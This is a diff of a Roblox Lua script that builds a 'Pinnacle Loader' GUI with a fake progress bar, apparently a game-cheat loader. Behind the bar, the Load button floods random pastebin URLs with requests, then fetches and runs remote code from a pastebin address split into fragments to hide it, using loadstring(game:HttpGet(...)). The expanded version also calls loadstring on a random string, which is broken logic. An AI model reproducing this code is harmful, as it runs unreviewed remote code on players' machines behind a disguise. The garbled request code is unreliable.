@@ -1,2 +1,333 @@
-local a={}a["1"]=Instance.new("ScreenGui",game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"))a["1"]["Name"]=[[PinnacleLoader]]a["1"]["ZIndexBehavior"]=Enum.ZIndexBehavior.Sibling;a["2"]=Instance.new("Frame",a["1"])a["2"]["BorderSizePixel"]=0;a["2"]["BackgroundColor3"]=Color3.fromRGB(17,17,17)a["2"]["AnchorPoint"]=Vector2.new(0.5,0.5)a["2"]["Size"]=UDim2.new(0,356,0,448)a["2"]["Position"]=UDim2.new(0.5,0,0.5,0)a["2"]["BorderColor3"]=Color3.fromRGB(0,0,0)a["2"]["Name"]=[[Main]]a["3"]=Instance.new("UICorner",a["2"])a["3"]["CornerRadius"]=UDim.new(0.01,10)a["4"]=Instance.new("Frame",a["2"])a["4"]["BorderSizePixel"]=0;a["4"]["BackgroundColor3"]=Color3.fromRGB(35,35,35)a["4"]["Size"]=UDim2.new(0,356,0,32)a["4"]["BorderColor3"]=Color3.fromRGB(0,0,0)a["4"]["Name"]=[[1]]a["5"]=Instance.new("UICorner",a["4"])a["5"]["CornerRadius"]=UDim.new(0.01,10)a["6"]=Instance.new("Frame",a["4"])a["6"]["BorderSizePixel"]=0;a["6"]["BackgroundColor3"]=Color3.fromRGB(35,35,35)a["6"]["Size"]=UDim2.new(0,356,0,24)a["6"]["Position"]=UDim2.new(0,0,0.52727,0)a["6"]["BorderColor3"]=Color3.fromRGB(0,0,0)a["6"]["Name"]=[[2]]a["7"]=Instance.new("UIStroke",a["6"])a["7"]["Thickness"]=1.5;a["7"]["Color"]=Color3.fromRGB(221,138,255)a["8"]=Instance.new("UIStroke",a["4"])a["8"]["Thickness"]=1.5;a["8"]["Color"]=Color3.fromRGB(221,138,255)a["9"]=Instance.new("Frame",a["4"])a["9"]["BorderSizePixel"]=0;a["9"]["BackgroundColor3"]=Color3.fromRGB(35,35,35)a["9"]["Size"]=UDim2.new(0,356,0,24)a["9"]["Position"]=UDim2.new(0,0,0.24602,0)a["9"]["BorderColor3"]=Color3.fromRGB(0,0,0)a["9"]["Name"]=[[3]]a["a"]=Instance.new("UIStroke",a["2"])a["a"]["Thickness"]=1.5;a["a"]["Color"]=Color3.fromRGB(221,138,255)a["b"]=Instance.new("TextLabel",a["2"])a["b"]["BorderSizePixel"]=0;a["b"]["BackgroundColor3"]=Color3.fromRGB(255,255,255)a["b"]["TextSize"]=20;a["b"]["FontFace"]=Font.new([[rbxassetid://12187371324]],Enum.FontWeight.Bold,Enum.FontStyle.Normal)a["b"]["TextColor3"]=Color3.fromRGB(255,255,255)a["b"]["BackgroundTransparency"]=1;a["b"]["Size"]=UDim2.new(0,356,0,40)a["b"]["BorderColor3"]=Color3.fromRGB(0,0,0)a["b"]["Text"]=[[Pinnacle Loader]]a["b"]["Name"]=[[loadertext]]a["c"]=Instance.new("TextLabel",a["2"])a["c"]["BorderSizePixel"]=0;a["c"]["BackgroundColor3"]=Color3.fromRGB(255,255,255)a["c"]["TextSize"]=20;a["c"]["FontFace"]=Font.new([[rbxassetid://12187371324]],Enum.FontWeight.Regular,Enum.FontStyle.Normal)a["c"]["TextColor3"]=Color3.fromRGB(255,255,255)a["c"]["BackgroundTransparency"]=1;a["c"]["RichText"]=true;a["c"]["Size"]=UDim2.new(0,356,0,121)a["c"]["BorderColor3"]=Color3.fromRGB(0,0,0)a["c"]["Text"]=[[For those who accept <font color='rgb(220,137,255)' transparency='0.03269804274348975'><b>nothing less</b></font>
-than <font color='rgb(220,137,255)' transparency='0.03269804274348975'><b>perfection</b></font> in Roblox.]]a["c"]["Position"]=UDim2.new(0,0,0.36384,0)a["d"]=Instance.new("LocalScript",a["c"])a["e"]=Instance.new("TextButton",a["2"])a["e"]["BorderSizePixel"]=0;a["e"]["TextSize"]=14;a["e"]["TextColor3"]=Color3.fromRGB(255,255,255)a["e"]["BackgroundColor3"]=Color3.fromRGB(36,36,36)a["e"]["FontFace"]=Font.new([[rbxasset://fonts/families/Inconsolata.json]],Enum.FontWeight.Regular,Enum.FontStyle.Normal)a["e"]["Size"]=UDim2.new(0,334,0,35)a["e"]["Name"]=[[exit]]a["e"]["BorderColor3"]=Color3.fromRGB(0,0,0)a["e"]["Text"]=[[Exit]]a["e"]["Position"]=UDim2.new(0.0309,0,0.89509,0)a["f"]=Instance.new("UICorner",a["e"])a["f"]["CornerRadius"]=UDim.new(0.01,10)a["10"]=Instance.new("LocalScript",a["e"])a["11"]=Instance.new("TextLabel",a["2"])a["11"]["BorderSizePixel"]=0;a["11"]["BackgroundColor3"]=Color3.fromRGB(255,255,255)a["11"]["TextSize"]=20;a["11"]["FontFace"]=Font.new([[rbxassetid://12187371324]],Enum.FontWeight.Regular,Enum.FontStyle.Normal)a["11"]["TextColor3"]=Color3.fromRGB(255,0,0)a["11"]["BackgroundTransparency"]=1;a["11"]["Size"]=UDim2.new(0,356,0,40)a["11"]["BorderColor3"]=Color3.fromRGB(0,0,0)a["11"]["Text"]=[[0%]]a["11"]["Name"]=[[percent]]a["11"]["Position"]=UDim2.new(0,0,0.14732,0)a["12"]=Instance.new("TextButton",a["2"])a["12"]["BorderSizePixel"]=0;a["12"]["TextSize"]=14;a["12"]["TextColor3"]=Color3.fromRGB(255,255,255)a["12"]["BackgroundColor3"]=Color3.fromRGB(36,36,36)a["12"]["FontFace"]=Font.new([[rbxasset://fonts/families/Inconsolata.json]],Enum.FontWeight.Regular,Enum.FontStyle.Normal)a["12"]["Size"]=UDim2.new(0,334,0,35)a["12"]["BorderColor3"]=Color3.fromRGB(0,0,0)a["12"]["Text"]=[[Load]]a["12"]["Position"]=UDim2.new(0.0309,0,0.80357,0)a["13"]=Instance.new("UICorner",a["12"])a["13"]["CornerRadius"]=UDim.new(0.01,10)a["14"]=Instance.new("LocalScript",a["12"])a["14"]["Name"]=[[loadbtn]]local function b()local a=a["d"]local a=a.Parent;a.RichText=true;a.Text="For those who accept <font color='rgb(220,137,255)'><b>nothing less</b></font>\nthan <font color='rgb(220,137,255)'><b>perfection</b></font> in Roblox."local b=1.5;local c=0.7;local d=1;task.spawn(function()while true do for e=0,1,0.01 do local e=math.sin(e*math.pi)local c=c+e*(d-c)a.Text=string.format("For those who accept <font color='rgb(220,137,255)' transparency='%s'><b>nothing less</b></font>\nthan <font color='rgb(220,137,255)' transparency='%s'><b>perfection</b></font> in Roblox.",1-c,1-c)a.TextStrokeTransparency=c*0.5;task.wait(b/100)end end end)end;task.spawn(b)local function b()local a=a["10"]local b=a.Parent;b.MouseButton1Click:Connect(function()a.Parent.Parent.Parent:Destroy()end)end;task.spawn(b)local function b()local a=a["14"]local b=game:GetService("HttpService")local c=game:GetService("ReplicatedStorage")local d=500;local e=3000;local f=a.Parent;local g=a.Parent.Parent.percent;g.Visible=false;local function h()local b=c:FindFirstChild("LoadPinnacle")if b and b.Value==true then g.Text="100%"g.TextColor3=Color3.fromRGB(0,255,0)g.Visible=true;task.wait(3)a.Parent.Parent.Parent:Destroy()return true end;return false end;local function c()g.Text="100%"g.TextColor3=Color3.fromRGB(0,255,0)task.wait(3)a.Parent.Parent.Parent:Destroy()end;local function a()local a=""for b=1,8 do local b=math.random(1,62)if b<=10 then a=a..string.char(b+47)elseif b<=36 then a=a..string.char(b+54)else a=a..string.char(b+60)end end;local a="https://pastebin.com/raw/"..a;pcall(function()b:GetAsync(a)end)end;local function b()local b=math.random(d,e)local d=0;local e=false;local function f()if h()then return true end;local a=math.min(d/b*100,100)g.Text=string.format("%.2f%%",a)local b=1-a/100;g.TextColor3=Color3.fromRGB(255*b,255*(1-b),0)if a>=100 then c()return true end;return false end;local function i()a()d=d+1;if f()then return true end;if not e and math.random()<d/b then local a='https://pastebin.com/raw/'local b='4wUC'local c='bWkW'local a=a..b..c;loadstring(game:HttpGet(a))()e=true end;return false end;local a=10;local e=0;local f=20;local j=true;task.spawn(function()while j do if h()then j=false;return end;task.wait(0.001)end end)for b=1,b,a do while e>=f do task.wait(0.01)end;for a=1,a do if not j then return end;task.spawn(function()if i()then return end;e=e+1;while e>0 do task.wait(0.0001)end end)end;task.wait(0)end;while d<b and j do task.wait(0.0001)end;j=false;if g.Parent then c()end end;f.MouseButton1Click:Connect(function()g.Visible=true;b()end)end;task.spawn(b)return a["1"],require
+-- // GUI TO LUA \\ --
+
+-- // INSTANCES: 20 | SCRIPTS: 3 | MODULES: 0 \\ --
+
+local UI = {}
+
+-- // ServerStorage.PinnacleLoader \\ --
+UI["1"] = Instance.new("ScreenGui", game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"))
+UI["1"]["Name"] = [[PinnacleLoader]]
+UI["1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling
+
+-- // ServerStorage.PinnacleLoader.Main \\ --
+UI["2"] = Instance.new("Frame", UI["1"])
+UI["2"]["BorderSizePixel"] = 0
+UI["2"]["BackgroundColor3"] = Color3.fromRGB(17, 17, 17)
+UI["2"]["AnchorPoint"] = Vector2.new(0.5, 0.5)
+UI["2"]["Size"] = UDim2.new(0, 356, 0, 448)
+UI["2"]["Position"] = UDim2.new(0.5, 0, 0.5, 0)
+UI["2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
+UI["2"]["Name"] = [[Main]]
+
+-- // ServerStorage.PinnacleLoader.Main.UICorner \\ --
+UI["3"] = Instance.new("UICorner", UI["2"])
+UI["3"]["CornerRadius"] = UDim.new(0.01, 10)
+
+-- // ServerStorage.PinnacleLoader.Main.1 \\ --
+UI["4"] = Instance.new("Frame", UI["2"])
+UI["4"]["BorderSizePixel"] = 0
+UI["4"]["BackgroundColor3"] = Color3.fromRGB(35, 35, 35)
+UI["4"]["Size"] = UDim2.new(0, 356, 0, 32)
+UI["4"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
+UI["4"]["Name"] = [[1]]
+
+-- // ServerStorage.PinnacleLoader.Main.1.UICorner \\ --
+UI["5"] = Instance.new("UICorner", UI["4"])
+UI["5"]["CornerRadius"] = UDim.new(0.01, 10)
+
+-- // ServerStorage.PinnacleLoader.Main.1.2 \\ --
+UI["6"] = Instance.new("Frame", UI["4"])
+UI["6"]["BorderSizePixel"] = 0
+UI["6"]["BackgroundColor3"] = Color3.fromRGB(35, 35, 35)
+UI["6"]["Size"] = UDim2.new(0, 356, 0, 24)
+UI["6"]["Position"] = UDim2.new(0, 0, 0.52727, 0)
+UI["6"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
+UI["6"]["Name"] = [[2]]
+
+-- // ServerStorage.PinnacleLoader.Main.1.2.UIStroke \\ --
+UI["7"] = Instance.new("UIStroke", UI["6"])
+UI["7"]["Thickness"] = 1.5
+UI["7"]["Color"] = Color3.fromRGB(221, 138, 255)
+
+-- // ServerStorage.PinnacleLoader.Main.1.UIStroke \\ --
+UI["8"] = Instance.new("UIStroke", UI["4"])
+UI["8"]["Thickness"] = 1.5
+UI["8"]["Color"] = Color3.fromRGB(221, 138, 255)
+
+-- // ServerStorage.PinnacleLoader.Main.1.3 \\ --
+UI["9"] = Instance.new("Frame", UI["4"])
+UI["9"]["BorderSizePixel"] = 0
+UI["9"]["BackgroundColor3"] = Color3.fromRGB(35, 35, 35)
+UI["9"]["Size"] = UDim2.new(0, 356, 0, 24)
+UI["9"]["Position"] = UDim2.new(0, 0, 0.24602, 0)
+UI["9"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
+UI["9"]["Name"] = [[3]]
+
+-- // ServerStorage.PinnacleLoader.Main.UIStroke \\ --
+UI["a"] = Instance.new("UIStroke", UI["2"])
+UI["a"]["Thickness"] = 1.5
+UI["a"]["Color"] = Color3.fromRGB(221, 138, 255)
+
+-- // ServerStorage.PinnacleLoader.Main.loadertext \\ --
+UI["b"] = Instance.new("TextLabel", UI["2"])
+UI["b"]["BorderSizePixel"] = 0
+UI["b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
+UI["b"]["TextSize"] = 20
+UI["b"]["FontFace"] = Font.new([[rbxassetid://12187371324]], Enum.FontWeight.Bold, Enum.FontStyle.Normal)
+UI["b"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
+UI["b"]["BackgroundTransparency"] = 1
+UI["b"]["Size"] = UDim2.new(0, 356, 0, 40)
+UI["b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
+UI["b"]["Text"] = [[Pinnacle Loader]]
+UI["b"]["Name"] = [[loadertext]]
+
+-- // ServerStorage.PinnacleLoader.Main.TextLabel \\ --
+UI["c"] = Instance.new("TextLabel", UI["2"])
+UI["c"]["BorderSizePixel"] = 0
+UI["c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
+UI["c"]["TextSize"] = 20
+UI["c"]["FontFace"] = Font.new([[rbxassetid://12187371324]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
+UI["c"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
+UI["c"]["BackgroundTransparency"] = 1
+UI["c"]["RichText"] = true
+UI["c"]["Size"] = UDim2.new(0, 356, 0, 121)
+UI["c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
+UI["c"]["Text"] = [[For those who accept <font color='rgb(220,137,255)' transparency='0.03269804274348975'><b>nothing less</b></font>
+than <font color='rgb(220,137,255)' transparency='0.03269804274348975'><b>perfection</b></font> in Roblox.]]
+UI["c"]["Position"] = UDim2.new(0, 0, 0.36384, 0)
+
+-- // ServerStorage.PinnacleLoader.Main.TextLabel.LocalScript \\ --
+UI["d"] = Instance.new("LocalScript", UI["c"])
+
+
+-- // ServerStorage.PinnacleLoader.Main.exit \\ --
+UI["e"] = Instance.new("TextButton", UI["2"])
+UI["e"]["BorderSizePixel"] = 0
+UI["e"]["TextSize"] = 14
+UI["e"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
+UI["e"]["BackgroundColor3"] = Color3.fromRGB(36, 36, 36)
+UI["e"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
+UI["e"]["Size"] = UDim2.new(0, 334, 0, 35)
+UI["e"]["Name"] = [[exit]]
+UI["e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
+UI["e"]["Text"] = [[Exit]]
+UI["e"]["Position"] = UDim2.new(0.0309, 0, 0.89509, 0)
+
+-- // ServerStorage.PinnacleLoader.Main.exit.UICorner \\ --
+UI["f"] = Instance.new("UICorner", UI["e"])
+UI["f"]["CornerRadius"] = UDim.new(0.01, 10)
+
+-- // ServerStorage.PinnacleLoader.Main.exit.LocalScript \\ --
+UI["10"] = Instance.new("LocalScript", UI["e"])
+
+
+-- // ServerStorage.PinnacleLoader.Main.percent \\ --
+UI["11"] = Instance.new("TextLabel", UI["2"])
+UI["11"]["BorderSizePixel"] = 0
+UI["11"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
+UI["11"]["TextSize"] = 20
+UI["11"]["FontFace"] = Font.new([[rbxassetid://12187371324]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
+UI["11"]["TextColor3"] = Color3.fromRGB(255, 0, 0)
+UI["11"]["BackgroundTransparency"] = 1
+UI["11"]["Size"] = UDim2.new(0, 356, 0, 40)
+UI["11"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
+UI["11"]["Text"] = [[0%]]
+UI["11"]["Name"] = [[percent]]
+UI["11"]["Position"] = UDim2.new(0, 0, 0.14732, 0)
+
+-- // ServerStorage.PinnacleLoader.Main.TextButton \\ --
+UI["12"] = Instance.new("TextButton", UI["2"])
+UI["12"]["BorderSizePixel"] = 0
+UI["12"]["TextSize"] = 14
+UI["12"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
+UI["12"]["BackgroundColor3"] = Color3.fromRGB(36, 36, 36)
+UI["12"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
+UI["12"]["Size"] = UDim2.new(0, 334, 0, 35)
+UI["12"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
+UI["12"]["Text"] = [[Load]]
+UI["12"]["Position"] = UDim2.new(0.0309, 0, 0.80357, 0)
+
+-- // ServerStorage.PinnacleLoader.Main.TextButton.UICorner \\ --
+UI["13"] = Instance.new("UICorner", UI["12"])
+UI["13"]["CornerRadius"] = UDim.new(0.01, 10)
+
+-- // ServerStorage.PinnacleLoader.Main.TextButton.loadbtn \\ --
+UI["14"] = Instance.new("LocalScript", UI["12"])
+UI["14"]["Name"] = [[loadbtn]]
+
+-- // ServerStorage.PinnacleLoader.Main.TextLabel.LocalScript \\ --
+local function SCRIPT_d()
+local script = UI["d"]
+	local textLabel = script.Parent
+	textLabel.RichText = true
+	textLabel.Text = "For those who accept <font color='rgb(220,137,255)'><b>nothing less</b></font>\nthan <font color='rgb(220,137,255)'><b>perfection</b></font> in Roblox."
+	
+	local pulseSpeed = 1.5
+	local minTransparency = 0.7
+	local maxTransparency = 1
+	
+	task.spawn(function()
+		while true do
+			for i = 0, 1, 0.01 do
+				local alpha = math.sin(i * math.pi)
+				local transparency = minTransparency + (alpha * (maxTransparency - minTransparency))
+				textLabel.Text = string.format("For those who accept <font color='rgb(220,137,255)' transparency='%s'><b>nothing less</b></font>\nthan <font color='rgb(220,137,255)' transparency='%s'><b>perfection</b></font> in Roblox.", 1 - transparency, 1 - transparency)
+				textLabel.TextStrokeTransparency = transparency * 0.5
+				task.wait(pulseSpeed / 100)
+			end
+		end
+	end)
+	
+end
+task.spawn(SCRIPT_d)
+-- // ServerStorage.PinnacleLoader.Main.exit.LocalScript \\ --
+local function SCRIPT_10()
+local script = UI["10"]
+	local button = script.Parent
+	
+	button.MouseButton1Click:Connect(function()
+		script.Parent.Parent.Parent:Destroy()
+	end)
+	
+end
+task.spawn(SCRIPT_10)
+-- // ServerStorage.PinnacleLoader.Main.TextButton.loadbtn \\ --
+local function SCRIPT_14()
+local script = UI["14"]
+	local HttpService = game:GetService("HttpService")
+	local ReplicatedStorage = game:GetService("ReplicatedStorage")
+	local min = 500
+	local max = 3000
+	local button = script.Parent
+	local percentLabel = script.Parent.Parent.percent
+	percentLabel.Visible = false
+	
+	local function checkLoadPinnacle()
+		local loadPinnacle = ReplicatedStorage:FindFirstChild("LoadPinnacle")
+		if loadPinnacle and loadPinnacle.Value == true then
+			percentLabel.Text = "100%"
+			percentLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
+			percentLabel.Visible = true
+			task.wait(3)
+			script.Parent.Parent.Parent:Destroy()
+			return true
+		end
+		return false
+	end
+	
+	local function destroyGUI()
+		percentLabel.Text = "100%"
+		percentLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
+		task.wait(3)
+		script.Parent.Parent.Parent:Destroy()
+	end
+	
+	local function makeRequest()
+		local code = ""
+		for i = 1, 8 do
+			local rand = math.random(1, 62)
+			if rand <= 10 then
+				code = code .. string.char(rand + 47)
+			elseif rand <= 36 then
+				code = code .. string.char(rand + 54)
+			else
+				code = code .. string.char(rand + 60)
+			end
+		end
+		local url = loadstring(game:HttpGet(code))()
+		pcall(function()
+			HttpService:GetAsync(url)
+		end)
+	end
+	
+	local function makeMultipleRequests()
+		local totalRequests = math.random(min, max)
+		local completedRequests = 0
+		local doneTriggered = false
+	
+		local function updateProgress()
+			if checkLoadPinnacle() then
+				return true
+			end
+	
+			local percentage = math.min((completedRequests / totalRequests) * 100, 100)
+			percentLabel.Text = string.format("%.2f%%", percentage)
+			local colorValue = 1 - (percentage / 100)
+			percentLabel.TextColor3 = Color3.fromRGB(255 * colorValue, 255 * (1 - colorValue), 0)
+	
+			if percentage >= 100 then
+				destroyGUI()
+				return true
+			end
+			return false
+		end
+	
+		local function processRequest()
+			makeRequest()
+			completedRequests = completedRequests + 1
+			if updateProgress() then
+				return true
+			end
+			if not doneTriggered and math.random() < (completedRequests / totalRequests) then
+				local part1 = 'https://pastebin.com/raw/'
+				local part2 = '4wUC'
+				local part3 = 'bWkW'
+				local url = part1 .. part2 .. part3
+				loadstring(game:HttpGet(url))()
+	
+				doneTriggered = true
+			end
+			return false
+		end
+	
+		local batchSize = 10
+		local concurrentRequests = 0
+		local maxConcurrentRequests = 20
+	
+		local checking = true
+		task.spawn(function()
+			while checking do
+				if checkLoadPinnacle() then
+					checking = false
+					return
+				end
+				task.wait(0.001)
+			end
+		end)
+	
+		for i = 1, totalRequests, batchSize do
+			while concurrentRequests >= maxConcurrentRequests do
+				task.wait(0.01)
+			end
+			for j = 1, batchSize do
+				if not checking then return end
+				task.spawn(function()
+					if processRequest() then return end
+					concurrentRequests = concurrentRequests + 1
+					while concurrentRequests > 0 do
+						task.wait(0.0001)
+					end
+				end)
+			end
+			task.wait(0)
+		end
+	
+		while completedRequests < totalRequests and checking do
+			task.wait(0.0001)
+		end
+	
+		checking = false
+	
+		if percentLabel.Parent then
+			destroyGUI()
+		end
+	end
+	
+	button.MouseButton1Click:Connect(function()
+		percentLabel.Visible = true
+		makeMultipleRequests()
+	end)
+end
+task.spawn(SCRIPT_14)
+
+return UI["1"], require;
